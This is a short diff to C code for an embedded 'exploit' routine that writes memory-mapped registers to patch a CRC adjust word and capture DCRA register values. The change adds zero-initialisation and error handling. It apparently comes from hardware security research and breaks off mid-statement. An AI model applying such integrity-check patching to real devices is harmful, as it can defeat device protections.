@@ -97,7 +97,7 @@ void exploit(void) __attribute__((section(".text.entry"), used, noreturn));
 
 void exploit(void) {
   struct runtime_guard guard;
-  uint32_t values[PROTO_DCRA_RECORD_COUNT];
+  uint32_t values[PROTO_DCRA_RECORD_COUNT] = {0u};
   uint32_t snapshots[40];
   uint32_t magic0;
   uint32_t magic1;
@@ -124,9 +124,15 @@ void exploit(void) {
   values[PROTO_DCRA_ADJUST_ADDRESS] = CRC_ADJUST;
   values[PROTO_DCRA_OLD_ADJUST_WORD] = MMIO32(CRC_ADJUST);
   values[PROTO_DCRA_NEW_ADJUST_WORD] = CRC_PATCHED_ADJUST_WORD;
-  values[PROTO_DCRA_ORIGINAL_RAW] = dcra_full_raw(0u, &guard);
-  values[PROTO_DCRA_PATCHED_RAW] = dcra_full_raw(1u, &guard);
-  restore_dcra(values[PROTO_DCRA_ENTRY_CTL], values[PROTO_DCRA_ENTRY_COUT]);
+  if ((values[PROTO_DCRA_ENTRY_CTL] & 3u) != 0u) {
+    if (primary_code == 0u) primary_code = 3u;
+  } else {
+    values[PROTO_DCRA_ORIGINAL_RAW] = dcra_full_raw(0u, &guard);
+    values[PROTO_DCRA_PATCHED_RAW] = dcra_full_raw(1u, &guard);
+    if (restore_dcra(values[PROTO_DCRA_ENTRY_CTL], values[PROTO_DCRA_ENTRY_COUT]) != 0u) {
+      if (primary_code == 0u) primary_code = 3u;
+    }
+  }
   values[PROTO_DCRA_EXIT_CTL] = DCRA_CTL;
   values[PROTO_DCRA_EXIT_COUT] = DCRA_COUT;
   if (primary_code == 0u
